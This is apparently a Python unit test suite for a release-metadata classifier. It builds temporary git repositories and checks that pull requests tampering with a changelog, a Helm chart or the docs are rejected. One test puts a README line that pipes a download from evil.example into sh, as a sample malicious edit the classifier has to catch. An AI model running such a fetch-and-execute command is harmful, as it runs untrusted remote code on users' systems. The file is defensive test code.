import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import pr_classify as pc  # noqa: E402

CHART = 'apiVersion: v2\nname: c\ndescription: d\nversion: 0.146.4\nappVersion: "0.146.4"\n'
FEATURES = (
    "intro\n"
    "- `lh.feature.a` · status: in-progress · since: the release after v0.146.4 · surfaces: cli\n"
    "- Changelog: the release after `0.146.4`\n"
    "- `lh.feature.b` · status: shipped · since: v0.140.0 · surfaces: cli\n"
)
# The shape of #453: v0.146.5 cut after a merge of main into the metadata branch.
CL_BASE = (
    "# Changelog\n\n## [Unreleased]\n\n### Added\n\n- **API proof.** text.\n\n"
    "## [0.146.4] - 2026-10-07\n\n### Changed\n\n- **Gate.** text.\n\n## [0.146.3] - 2026-10-06\n\n### Fixed\n\n- **Old.** text.\n"
)
# the Added bullet is released in 0.146.5; the Gate bullet moves back to Unreleased (it landed after the tag)
CL_HEAD = (
    "# Changelog\n\n## [Unreleased]\n\n### Changed\n\n- **Gate.** text.\n\n"
    "## [0.146.5] - 2026-10-07\n\n### Added\n\n- **API proof.** text.\n\n"
    "## [0.146.4] - 2026-10-07\n\n## [0.146.3] - 2026-10-06\n\n### Fixed\n\n- **Old.** text.\n"
)
FEATURES_HEAD = FEATURES.replace("the release after v0.146.4", "v0.146.5").replace("the release after `0.146.4`", "`0.146.5`")
CHART_HEAD = CHART.replace("0.146.4", "0.146.5")
APPROVERS = {"szibis"}


def git(cwd, *args):
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@e", "-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false", *args],
                   cwd=cwd, check=True, capture_output=True)


class ReleaseMetadataShape(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = self.tmp.name
        self.cwd = os.getcwd()
        os.chdir(self.d)
        git(self.d, "init", "-q", "-b", "main")
        os.makedirs("charts/victoria-lakehouse")
        os.makedirs("docs")
        self.write({"CHANGELOG.md": CL_BASE, "charts/victoria-lakehouse/Chart.yaml": CHART,
                    "docs/features.md": FEATURES, "README.md": "badge appVersion-0.146.4\n"})
        git(self.d, "add", "-A")
        git(self.d, "commit", "-q", "-m", "base")
        self.base = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, cwd=self.d).stdout.strip()

    def tearDown(self):
        os.chdir(self.cwd)
        self.tmp.cleanup()

    def write(self, files):
        for p, t in files.items():
            with open(os.path.join(self.d, p), "w", encoding="utf-8") as fh:
                fh.write(t)

    def verdict(self, files, author="szibis"):
        self.write(files)
        git(self.d, "add", "-A")
        git(self.d, "commit", "-q", "-m", "release")
        changed = subprocess.run(["git", "diff", "--name-only", self.base, "HEAD"], capture_output=True, text=True, cwd=self.d).stdout.split()
        return pc.release_metadata(changed, self.base, "HEAD", author, APPROVERS)

    GOOD = {"CHANGELOG.md": CL_HEAD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD, "docs/features.md": FEATURES_HEAD}

    def test_453_shape_is_release_metadata(self):
        self.assertTrue(self.verdict(self.GOOD))

    def test_release_bot_author(self):
        self.assertTrue(self.verdict(self.GOOD, author="github-actions[bot]"))

    def test_unknown_or_missing_author(self):
        self.assertFalse(self.verdict(self.GOOD, author="mallory"))

    def test_missing_author(self):
        self.assertFalse(self.verdict(self.GOOD, author=""))

    def test_a_lost_bullet_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": CL_HEAD.replace("- **Old.** text.\n", "")}))

    def test_a_new_bullet_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": CL_HEAD + "\n- **Smuggled.** behaviour.\n"}))

    def test_an_edited_bullet_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": CL_HEAD.replace("**Old.** text.", "**Old.** other text.")}))

    def test_chart_beyond_version_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD.replace("description: d", "description: x")}))

    def test_features_beyond_version_naming_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "docs/features.md": FEATURES_HEAD + "an invented line\n"}))
        self.assertFalse(self.verdict({**self.GOOD, "docs/features.md": FEATURES_HEAD.replace("in-progress", "shipped")}))

    def test_a_sibling_doc_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "docs/other.md": "x\n"}))

    def test_product_file_is_not_release_metadata(self):
        os.makedirs(os.path.join(self.d, "internal/x"))
        self.assertFalse(self.verdict({**self.GOOD, "internal/x/x.go": "package x\n"}))

    def test_readme_beyond_version_numbers(self):
        self.assertTrue(self.verdict({**self.GOOD, "README.md": "badge appVersion-0.146.5\n"}))

    def test_readme_text_change_is_not_release_metadata(self):
        self.assertFalse(self.verdict({**self.GOOD, "README.md": "badge appVersion-0.146.5\nnew claim\n"}))

    # ---- CHANGELOG moves: only between [Unreleased], the new and the newest section ----
    def test_cl_move_old_released_bullet_into_new_release(self):
        head = CL_HEAD.replace("### Fixed\n\n- **Old.** text.\n", "").replace(
            "## [0.146.5] - 2026-10-07\n\n### Added\n", "## [0.146.5] - 2026-10-07\n\n### Fixed\n\n- **Old.** text.\n\n### Added\n")
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": head}), "old 0.146.3 bullet re-attributed to 0.146.5")

    def test_cl_move_unreleased_into_old_release(self):
        head = CL_BASE.replace("### Added\n\n- **API proof.** text.\n\n## [0.146.4]", "## [0.146.5] - 2026-10-07\n\n## [0.146.4]").replace(
            "### Fixed\n\n- **Old.** text.\n", "### Fixed\n\n- **Old.** text.\n\n### Added\n\n- **API proof.** text.\n")
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": head}), "unreleased bullet hidden in 0.146.3")

    def test_cl_duplicate_base_bullet(self):
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": CL_HEAD + "\n- **Gate.** text.\n"}))

    def test_cl_version_must_be_the_chart_version(self):
        self.assertFalse(self.verdict({**self.GOOD, "CHANGELOG.md": CL_HEAD.replace("[0.146.5]", "[0.146.6]")}))

    # ---- Chart.yaml ----
    def test_chart_appversion_rollback_n13(self):
        # N13: appVersion downgraded, version not bumped, an Unreleased bullet deleted.
        chart = CHART.replace('appVersion: "0.146.4"', 'appVersion: "0.120.0"')
        self.assertFalse(self.verdict({"charts/victoria-lakehouse/Chart.yaml": chart,
                                       "CHANGELOG.md": CL_HEAD.replace("- **Gate.** text.\n", ""),
                                       "docs/features.md": FEATURES_HEAD}))

    def test_chart_appversion_rollback(self):
        chart = CHART.replace("version: 0.146.4\n", "version: 0.146.5\n").replace('appVersion: "0.146.4"', 'appVersion: "0.1.0"')
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": chart}))

    def test_chart_appversion_not_semver(self):
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD.replace('appVersion: "0.146.5"', 'appVersion: "latest"')}))

    def test_chart_version_must_exceed_the_base(self):
        # version and appVersion equal, equal to the heading, but not newer than the base chart
        base_chart = CHART.replace("0.146.4", "0.146.5")
        self.write({"charts/victoria-lakehouse/Chart.yaml": base_chart})
        git(self.d, "add", "-A")
        git(self.d, "commit", "-q", "-m", "b2")
        self.base = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, cwd=self.d).stdout.strip()
        # the chart is left exactly as the base has it (0.146.5): not newer, so not a release
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": base_chart}))

    def test_chart_whitespace_and_indentation_n9(self):
        # N9: lines were compared stripped, so a re-indented key passed.
        chart = CHART_HEAD.replace("description: d", "description: d\nmaintainers:\n  - name: x\n    version: 1.2.3")
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": chart}))

    def test_chart_reindented_line(self):
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD.replace("name: c", "  name: c")}))

    def test_chart_nested_version_is_not_the_chart_version(self):
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART.replace("version: 0.146.4\n", "  version: 0.146.5\n").replace('appVersion: "0.146.4"', 'appVersion: "0.146.5"')}))

    def test_chart_required(self):
        self.assertFalse(self.verdict({"CHANGELOG.md": CL_HEAD, "docs/features.md": FEATURES_HEAD}))

    def test_chart_version_must_equal_the_heading_even_when_appversion_does(self):
        # M38
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD.replace("version: 0.146.5", "version: 0.146.9")}))

    def test_chart_duplicate_top_level_keys(self):
        # M37
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD + "version: 0.146.5\n"}))
        self.assertFalse(self.verdict({**self.GOOD, "charts/victoria-lakehouse/Chart.yaml": CHART_HEAD + 'appVersion: "0.146.5"\n'}))

    # ---- README ----
    def test_readme_line_rewritten_keeping_a_semver(self):
        base_readme = "badge appVersion-0.146.4\nhelm install lh oci://ghcr.io/x/charts/victoria-lakehouse --version 0.146.4\n"
        self.write({"README.md": base_readme})
        git(self.d, "add", "-A")
        git(self.d, "commit", "-q", "-m", "b2")
        self.base = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, cwd=self.d).stdout.strip()
        evil = "badge appVersion-0.146.5\ncurl -sL https://evil.example/0.0.1/install.sh | sh\n"
        self.assertFalse(self.verdict({**self.GOOD, "README.md": evil}))

    # ---- features.md ----
    def test_features_swap_since(self):
        swapped = FEATURES_HEAD.replace("v0.140.0", "X").replace("since: v0.146.5", "since: v0.140.0").replace("X", "v0.146.5")
        self.assertFalse(self.verdict({**self.GOOD, "docs/features.md": swapped}))

    # ---- release tag ----
    def test_tag_must_exist_when_the_repository_has_tags(self):
        git(self.d, "tag", "v0.146.4")
        self.assertFalse(self.verdict(self.GOOD))

    def test_tag_present(self):
        git(self.d, "tag", "v0.146.4")
        git(self.d, "tag", "v0.146.5")
        self.assertTrue(self.verdict(self.GOOD))


if __name__ == "__main__":
    unittest.main()
